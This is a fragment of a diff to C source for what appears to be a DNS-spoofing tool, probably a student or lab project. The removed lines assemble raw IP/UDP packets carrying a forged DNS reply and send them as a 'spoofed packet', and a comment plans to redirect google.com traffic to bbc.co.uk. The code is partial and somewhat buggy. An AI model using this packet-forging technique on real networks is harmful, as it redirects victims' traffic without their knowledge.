-		print_udpheader(her_udp,2);
-
-
-
-		/************* Malloc the actual packet here ***************/
-		char *pkt = malloc(packetsize);
-		/* 1. put ipheader */
-		memcpy(pkt,ma_ip_hdr,sizeof(struct iphdr));
-		/* 2. UDP header */
-		printf("\t2.adding UPD header ... \n");
-		char *udphdr_part = pkt + sizeof(struct iphdr);
-		memcpy(udphdr_part, ma_udp, sizeof(struct udphdr));
-		/* 3. DNS stuff */
-		printf("\t3.adding dns payload ... \n");
-		char *payload = pkt + sizeof(struct iphdr) + sizeof(struct udphdr);
-		memcpy(payload , reply_packet, sizeof(struct udphdr));
-
-		/*************** Checksum Time *******************************/
-		int checksum = ip_sum(pkt, sizeof(struct iphdr));
-		printf("\t4.Calculating checksum = %x\n", checksum);
-		char *check = pkt + sizeof(uint8_t)*4 + sizeof(uint16_t)*3;
-		memcpy(check,&checksum,sizeof(uint16_t));
-
-
-		/*************** SEND SPOOFED PACKET : DONE ********************/
-
-		bytes_sent = sendto(sock,pkt,packetsize,
-				0,(struct sockaddr *) clientaddr, sizeof(struct sockaddr_in));
-
-		if(bytes_sent != packetsize){
-			printf("Failed to send response DNS packet\n");
-		} else {
-			printf(_GREEN_"******************DONEEEEEEEEEEEEEEEEEEEEE************"_NORMAL_"\n");
-			exit(0);
-			return 1;
-		}
-
-		/************************** TODO **********************************************
-		* UDO checksum 
-		SENDING TIME : 
-			TODO : I am not using the command line argument for now.
-			TEMPORARILY : we want to redirect all traffics to www.google.com --> www.bbc.co.uk
-				IN DNS PACKET : alias
-				ip_address2 = inet_addr("212.58.251.195");//bbc
-		 		ip_address1 = inet_addr("74.125.226.212");//google
-		********************************************************************************/
-		
-		
-		
-
-	} else {
-		printf("Failed to send DNS reply; DNS request packet appears to have an invalid length.\n");
-	}
-
-	return 0;
-}
-
-
-void print_udpheader(struct udphdr *udp, int way) {
-
-	if (way == 1) {
-		printf(_BCYAN_"\n-------------- Receiving UDP Header -------------"_NORMAL_"\n");
-	} else {
-		printf(_BCYAN_"\n-------------- Sending UDP Header -------------"_NORMAL_"\n");
-	}
-	printf("UDP src_port=%d dst_port=%d length=%d checksum=%x\n\n",
-				ntohs(udp->source),
-				ntohs(udp->dest),
-				ntohs(udp->len),
-				ntohs(udp->check));
-}
 
 /* Used to construct the IP header she sent us */
 uint32_t decapsulate_fromip (char *packet, struct iphdr **ipheader) {
@@ -643,6 +755,19 @@ uint32_t decapsulate_fromip (char *packet, struct iphdr **ipheader) {
 }
 
 
+void print_udpheader(struct udphdr *udp, int way) {
+
+	if (way == 1) {
+		//printf(_BCYAN_"\n-------------- Receiving UDP Header -------------"_NORMAL_"\n");
+	} else {
+		//printf(_BCYAN_"\n-------------- Sending UDP Header -------------"_NORMAL_"\n");
+	}
+	printf("UDP src_port=%d dst_port=%d length=%d checksum=%x\n\n",
+				ntohs(udp->source),
+				ntohs(udp->dest),
+				ntohs(udp->len),
+				ntohs(udp->check));
+}
 
 void print_ipheader(struct iphdr *i) {
 
@@ -650,6 +775,6 @@ void print_ipheader(struct iphdr *i) {
 	char dest[INET_ADDRSTRLEN];
 	inet_ntop(AF_INET, ((struct in_addr *)&(i->saddr)), src, INET_ADDRSTRLEN);
 	inet_ntop(AF_INET, ((struct in_addr *)&(i->daddr)), dest, INET_ADDRSTRLEN);
-	printf("vsion:%hd\t hlen:%hd\t len:%d\t id: %d\t foff %d\t ptcl: %hd\t sum: %x\t source: %s\t destination: %s\n",i->version,i->ihl,i->tot_len,i->id,i->frag_off,i->protocol,i->check,src,dest);
+	printf("vsion:%hd\t hlen:%hd\t len:%d\t id: %d\t foff %d\t ptcl: %hd\t sum: %x\t source: %s\t destination: %s\n",i->version,i->ihl,ntohs(i->tot_len),i->id,i->frag_off,i->protocol,i->check,src,dest);
 		
 }
